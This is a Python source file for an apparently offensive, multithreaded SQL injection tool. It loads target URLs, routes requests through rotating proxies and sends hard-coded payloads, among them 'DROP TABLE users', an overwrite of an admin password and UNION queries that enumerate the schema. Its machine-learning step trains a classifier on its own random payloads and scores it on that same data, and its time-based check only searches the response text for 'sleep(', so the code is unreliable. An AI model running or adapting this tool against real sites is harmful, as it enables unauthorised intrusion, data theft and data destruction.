import requests
import re
import random
import string
import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split, GridSearchCV
from sklearn.feature_extraction.text import TfidfVectorizer
import matplotlib.pyplot as plt
import seaborn as sns
import threading
import logging
import time
import json

class SuperDuperSQLTool:
    def __init__(self):
        self.targets = []  # List of target URLs
        self.model = None
        self.tfidf = None
        self.num_threads = 20
        self.logger = self.setup_logger()
        self.verbose = False
        self.proxies = []
        self.payloads = []

    def setup_logger(self):
        logger = logging.getLogger('SuperDuperSQLTool')
        logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(ch)
        return logger

    def generate_payload(self, length):
        payloads = [
            # Standard SQL Injection payloads
            "' OR 1=1 --",
            "' OR '1'='1' --",
            "; DROP TABLE users; --",
            # Time-based SQL Injection payloads
            "'; IF(SLEEP(5)) --",
            "' AND SLEEP(5) AND '1'='1",
            # Boolean-based SQL Injection payloads
            "' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, NULL WHERE 1=0 --",
            "' AND (SELECT * FROM users WHERE username = 'admin') IS NOT NULL --",
            # Other common payloads
            "1'; UPDATE users SET password = 'hacked' WHERE id = 1 --",
            "'; INSERT INTO logs (username, action) VALUES ('admin', 'login') --",
            "' UNION SELECT @@version, NULL, NULL --",
            "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns --"
        ]
        return random.choice(payloads)

    def load_payloads_from_file(self, file_path):
        try:
            with open(file_path, 'r') as file:
                self.payloads = [line.strip() for line in file]
            self.logger.info(f"Loaded {len(self.payloads)} payloads from {file_path}")
        except Exception as e:
            self.logger.error(f"Failed to load payloads from file: {e}")

    def scan_for_sql_injection(self, url, payload):
        try:
            response = requests.get(url + payload, proxies=random.choice(self.proxies), timeout=10)
            if response.status_code == 200:
                if re.search(r"error|syntax|unexpected", response.text, re.IGNORECASE):
                    return response.text
                elif re.search(r"sleep\(\d+\)", response.text):
                    return "Time-based SQL injection vulnerability detected."
                elif "Welcome back!" in response.text:
                    return "Boolean-based SQL injection vulnerability detected."
        except requests.RequestException as e:
            self.logger.error(f"Error scanning {url}: {e}")
        return None

    def train_model(self, X_train, y_train):
        params = {'n_estimators': [50, 100, 150],
                  'max_depth': [None, 10, 20, 30],
                  'min_samples_split': [2, 5, 10],
                  'min_samples_leaf': [1, 2, 4]}

        grid_search = GridSearchCV(RandomForestClassifier(random_state=42), param_grid=params, cv=5)
        grid_search.fit(X_train, y_train)
        self.model = grid_search.best_estimator_

    def predict(self, X_test):
        return self.model.predict(X_test)

    def generate_new_payloads(self, num_payloads, length):
        payloads = []
        for _ in range(num_payloads):
            payload = self.generate_payload(length)
            payloads.append(payload)
        return payloads

    def visualize_results(self, y_test, predictions):
        cm = pd.crosstab(y_test, predictions, rownames=['Actual'], colnames=['Predicted'])
        sns.heatmap(cm, annot=True, fmt='d', cmap='Blues')
        plt.show()

    def scan_website_for_vulnerabilities(self):
        self.logger.info("Scanning websites for potential SQL injection vulnerabilities...")
        results = []

        def scan(url):
            payloads = self.generate_new_payloads(100, 20)
            for payload in payloads:
                response = self.scan_for_sql_injection(url, payload)
                if response:
                    results.append((url, payload, response))

        threads = []
        for target in self.targets:
            t = threading.Thread(target=scan, args=(target,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        for result in results:
            self.logger.info(f"Potential SQL injection vulnerability detected in {result[0]} with payload: {result[1]}")
            self.logger.info("Response:")
            self.logger.info(result[2])

    def load_targets_from_file(self, file_path):
        try:
            with open(file_path, 'r') as file:
                self.targets = [line.strip() for line in file]
            self.logger.info(f"Loaded {len(self.targets)} targets from {file_path}")
        except Exception as e:
            self.logger.error(f"Failed to load targets from file: {e}")

    def save_results_to_file(self, file_path, results):
        try:
            with open(file_path, 'w') as file:
                for result in results:
                    file.write(json.dumps(result) + '\n')
            self.logger.info(f"Results saved to {file_path}")
        except Exception as e:
            self.logger.error(f"Failed to save results to file: {e}")

    def main(self):
        print("""
  ____ _____ _____   _____       _____ _____ 
 / ___| ____|_   _| | ____|     | ____|_   _|
| |  _|  _|   | |   |  _| _____ |  _|   | |  
| |_| | |___  | |   | |__|_____| |___  | |  
 \____|_____| |_|   |_____|     |_____| |_|  ~ mlwar4
""")
        self.verbose = input("Enable verbose mode? (y/n): ").lower() == 'y'

        self.load_targets_from_file("targets.txt")
        self.load_payloads_from_file("payloads.txt")

        self.tfidf = TfidfVectorizer(ngram_range=(1, 2), max_features=10000)
        X = self.generate_new_payloads(2000, 20)
        y = [1 if "' OR 1=1 --" in payload else 0 for payload in X]
        X_tfidf = self.tfidf.fit_transform(X)

        self.train_model(X_tfidf, y)
        predictions = self.predict(X_tfidf)
        self.visualize_results(y, predictions)

        self.scan_website_for_vulnerabilities()


if __name__ == "__main__":
    tool = SuperDuperSQLTool()
    tool.main()
